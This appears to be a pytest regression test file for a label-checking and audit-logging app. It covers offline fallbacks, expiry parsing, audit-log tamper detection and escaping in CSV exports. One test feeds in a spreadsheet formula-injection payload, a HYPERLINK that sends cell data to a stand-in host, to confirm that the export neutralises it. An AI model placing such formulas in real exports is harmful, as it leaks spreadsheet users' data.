"""Regression tests for the review issues fixed on fix/review-b (one small test per issue)."""

import datetime as dt
import json
import re
from pathlib import Path

import pytest

STATIC = Path(__file__).resolve().parent.parent / "trova" / "static"


def _unreachable(monkeypatch, g):
    """Grok client whose network is down (xAI unreachable): answers come from the local stand-in, marked offline."""
    import requests

    from trova import grok as grok_mod

    def down(*a, **k):
        raise requests.ConnectionError("no route to host")
    monkeypatch.setattr(g.session, "post", down)
    monkeypatch.setattr(grok_mod.time, "sleep", lambda s: None)
    return g


# ---------------------------------------------------------------- labels (#7, #10, #30) and records (#31, #54)
def test_offline_or_skipped_labels_are_not_clear(monkeypatch):                # 7
    from trova.grok import GrokClient, register_mock
    from trova.labels import _mock_labels, read_labels
    from trova.proposals import find_blobs
    from trova.synthetic import SyntheticTable
    t = SyntheticTable(seed=11, n_objects=4)                     # cartons with printed lots only (no codes)
    f, boxes = t.render(), find_blobs(t.render(), t.empty())
    r = read_labels(_unreachable(monkeypatch, GrokClient("xai-test", offline_fallback=True)), f, boxes, lot="A123")
    assert r.offline and not r.as_dict()["ok"] and {p["kind"] for p in r.problems} == {"not_read"}
    register_mock("trova_labels", lambda p, i, ctx: {"items": []})   # Grok answers but skips every box
    try:
        r = read_labels(GrokClient(mock=True), f, boxes, lot="A123")
    finally:
        register_mock("trova_labels", _mock_labels)
    assert len(r.problems) == len(boxes) and all(p["kind"] == "not_read" for p in r.problems)


def test_expiry_prefers_the_code_and_unreadable_expiry_is_not_clear():        # 10
    from trova.grok import GrokClient, register_mock
    from trova.labels import _mock_labels, check_batch, read_labels
    from trova.proposals import find_blobs
    from trova.synthetic import SyntheticTable
    t = SyntheticTable(seed=11, n_objects=2)
    t.add_labelled("LOT A123 EXP 2025-01")                       # the demo sheet's expired carton
    f = t.render()
    boxes = find_blobs(f, t.empty())
    register_mock("trova_labels", lambda p, i, ctx: {"items": [
        {"box_id": b.id, "has_label": True, "text": "", "product": "", "lot": "A123", "expiry": "2025-0?"}
        for b in ctx["boxes"]]})
    try:
        r = read_labels(GrokClient(mock=True), f, boxes, lot="A123", today=dt.date(2026, 11, 5))
    finally:
        register_mock("trova_labels", _mock_labels)
    kinds = [p["kind"] for p in r.problems]
    assert "expired" in kinds                                    # the code's 2025-01 wins over the print's '2025-0?'
    item = {"box_id": 1, "lot": "A123", "code_lot": "", "print_lot": "A123"}
    for exp in ("JUN 2025", "2025-0?", "06 2025"):
        assert [p["kind"] for p in check_batch([item | {"expiry": exp}], "A123", dt.date(2026, 11, 5))] == ["unreadable_expiry"]


def test_code_expiry_keeps_four_digit_years():                                # 30
    from trova.labels import parse_date, parse_expiry_text
    assert parse_expiry_text("LOT A123 EXP 06/2027") == "06/2027"
    assert parse_date(parse_expiry_text("LOT A123 EXP 12.2027")) == dt.date(2027, 12, 31)
    assert parse_expiry_text("LOT A1 EXP 2027-06-30") == "2027-06-30" and parse_expiry_text("Scad. 30/06/27") == "30/06/27"


def test_offline_check_is_marked_offline_in_result_and_records(tmp_path, monkeypatch):   # 31
    from test_pipeline import _client
    app, c = _client(tmp_path, monkeypatch, mock="0", XAI_API_KEY="xai-test")
    st = app.state.trova
    _unreachable(monkeypatch, st.grok)
    c.post("/api/background", data={"mode": "capture"})
    c.post("/api/reference", data={"describe": "false"})
    st.source.table.tamper("add")
    d = c.post("/api/changes").json()
    r = d["result"]
    assert d["offline"] and r["offline"] and not r["line_clear"] and r["summary"].startswith("OFFLINE")
    assert all(ch["verified"] is None for ch in r["changes"])
    assert "OFFLINE: Grok was unreachable" in c.get("/api/report").text
    assert c.get("/api/report.pdf").status_code == 200


def test_pdf_record_with_markup_in_the_lot(tmp_path):                          # 54
    from trova.record_pdf import build
    check = {"event_id": "e1", "time": "t", "model": "m", "ref_marked": "x.jpg", "cur_marked": "y.jpg",
             "result": {"line_clear": False, "summary": "", "changes": [], "filtered": [],
                        "batch": {"lot": "A<B", "items": [], "problems": []}}}
    assert build(check, tmp_path)[:4] == b"%PDF"


# ---------------------------------------------------------------- audit log (#13, #14, #33)
def test_audit_verify_after_ten_named_objects(tmp_path):                       # 13
    from trova.audit import AuditLog
    a = AuditLog(tmp_path)
    a.event("reference", n_objects=12, names={i: f"object {i}" for i in range(1, 13)})
    a.event("signoff", operator="Ana", decision="approve")
    assert a.verify()["ok"]


def test_audit_anchor_detects_tail_deletion_stripped_hashes_and_prepends(tmp_path):   # 14
    from trova.audit import AuditLog

    def fresh(name):
        a = AuditLog(tmp_path / name)
        for k in ("reference", "change_check", "signoff", "signoff"):
            a.event(k, decision="reject")
        assert a.verify()["ok"]
        log = tmp_path / name / "events.jsonl"
        return a, log, log.read_text().splitlines()

    _, log, lines = fresh("tail")
    log.write_text("\n".join(lines[:-2]) + "\n")                # server stopped, the last 2 sign-offs deleted
    v = AuditLog(tmp_path / "tail").verify()
    assert not v["ok"] and "deleted" in v["reason"]

    _, log, lines = fresh("stripped")
    stripped = []
    for line in lines:
        e = json.loads(line)
        e.pop("hash")
        e["decision"] = "approve"
        stripped.append(json.dumps(e))
    log.write_text("\n".join(stripped) + "\n")                  # every hash removed, decisions rewritten
    assert not AuditLog(tmp_path / "stripped").verify()["ok"]

    a, log, lines = fresh("prepend")
    log.write_text(json.dumps({"id": "x", "kind": "signoff", "decision": "approve"}) + "\n" + "\n".join(lines) + "\n")
    assert not a.verify()["ok"]                                  # unhashed line prepended while running
    assert not AuditLog(tmp_path / "prepend").verify()["ok"]     # and after a restart

    _, log, _ = fresh("deleted")
    log.unlink()
    assert not AuditLog(tmp_path / "deleted").verify()["ok"]     # the whole log deleted


def test_audit_torn_last_line_is_quarantined(tmp_path):                       # 33
    from trova.audit import AuditLog
    a = AuditLog(tmp_path)
    a.event("reference", n_objects=1)
    with (tmp_path / "events.jsonl").open("a") as f:
        f.write('{"id": "abc", "kind": "sig')                    # killed mid-write
    b = AuditLog(tmp_path)
    b.event("signoff", operator="Ana", decision="reject")
    assert b.all()[-1]["kind"] == "signoff" and b.verify()["ok"]
    assert '"sig' in (tmp_path / "events.partial").read_text()


# ---------------------------------------------------------------- history page (#34, #35, #53, #57)
def test_history_csv_cells_are_not_formulas():                                 # 34
    from trova.history import to_csv
    rows = [{"time": "t", "id": "1", "kind": "find", "group": "finds", "what": '=HYPERLINK("http://x/?"&A1,"open")',
             "result": "+1", "image": None}]
    cells = to_csv(rows).splitlines()[1]
    assert "'=HYPERLINK" in cells and ",'+1," in cells


def test_history_csv_link_is_not_capped():                                     # 35
    html = (STATIC / "history.html").read_text()
    href = re.search(r"\$\('csv'\)\.href = (.*);", html).group(1)
    assert "qs" not in href and "n:" not in href


def test_history_shows_operator_resets_and_lift_recoveries():                  # 53
    from trova.history import summarize
    s = summarize({"kind": "arm_lift_recovery", "operator": "staff-ana", "note": "fork freed by hand"})
    assert s["group"] == "arm" and "staff-ana" in s["result"] and "fork freed" in s["result"]
    assert summarize({"kind": "arm_reset", "operator": "staff-ana"})["group"] == "arm"
    assert summarize({"kind": "teach_pose", "name": "home_joints"})["group"] == "setup"


def test_jury_and_history_pages_have_stop():                                   # 57
    for page in ("jury.html", "history.html"):
        html = (STATIC / page).read_text()
        assert 'id="stop"' in html and "/api/arm/stop" in html
        assert "keydown" in html and "Escape" in html and "Space" in html
